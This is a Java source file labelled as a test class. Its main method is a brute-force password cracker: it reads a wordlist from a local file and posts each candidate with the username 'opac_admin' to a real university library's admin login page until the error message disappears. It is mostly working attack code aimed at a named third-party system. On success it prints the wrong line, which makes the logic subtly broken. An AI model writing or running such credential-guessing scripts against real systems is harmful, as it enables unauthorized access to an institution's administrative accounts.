package com.lib.test.service;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.URL;
import java.net.URLConnection;

import com.lib.domain.User;

public class Test {

	public static void main(String[] args) throws IOException {
		/*
		 * User user1 = new User(); user1.setName(123); User user2 = new User();
		 * user2 = user1; user2.setEmail("284135112@qq.com");
		 * System.out.println("对象/t用户名/t邮箱"); System.out.println("user1/t" +
		 * user1.getName() + "/t" + user1.getEmail());
		 * System.out.println("user2/t" + user2.getName() + "/t" +
		 * user2.getEmail());
		 */
		/*
		 * String test = "newnew"; System.out.println(test.substring(0, 6));
		 */
		File file = new File("G:\\pass3.txt");
		BufferedReader reader = null;
		reader = new BufferedReader(new FileReader(file));
		int i = 0;
		String temp;
		while ((temp = reader.readLine()) != null) {
			String result2 = sendPost("http://lib.stdu.edu.cn/hwweb/admin/", 
					"passwd=" + temp.trim() + "&username=opac_admin");
			if (!result2.contains("用户名或者密码错误")) {
				System.out.println("密码是:" + reader.readLine());
				break;
			}
			i++;
			if (i % 200 == 0) {
				System.out.println("第" + i + "次尝试...");
			}
		}
		System.out.println("没有找到密码!");
	}

	public static String sendPost(String url, String param) {
		PrintWriter out = null;
		BufferedReader in = null;
		String result = "";
		try {
			URL realUrl = new URL(url);
			// 打开和URL之间的连接
			URLConnection conn = realUrl.openConnection();
			// 设置通用的请求属性
			conn.setRequestProperty("accept", "*/*");
			conn.setRequestProperty("connection", "Keep-Alive");
			conn.setRequestProperty("user-agent",
					"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");
			// 发送POST请求必须设置如下两行
			conn.setDoOutput(true);
			conn.setDoInput(true);
			// 获取URLConnection对象对应的输出流
			out = new PrintWriter(conn.getOutputStream());
			// 发送请求参数
			out.print(param);
			// flush输出流的缓冲
			out.flush();
			// 定义BufferedReader输入流来读取URL的响应
			in = new BufferedReader(
					new InputStreamReader(conn.getInputStream()));
			String line;
			while ((line = in.readLine()) != null) {
				result += line;
			}
		} catch (Exception e) {
			System.out.println("发送 POST 请求出现异常！" + e);
			e.printStackTrace();
		}
		// 使用finally块来关闭输出流、输入流
		finally {
			try {
				if (out != null) {
					out.close();
				}
				if (in != null) {
					in.close();
				}
			} catch (IOException ex) {
				ex.printStackTrace();
			}
		}
		return result;
	}

}
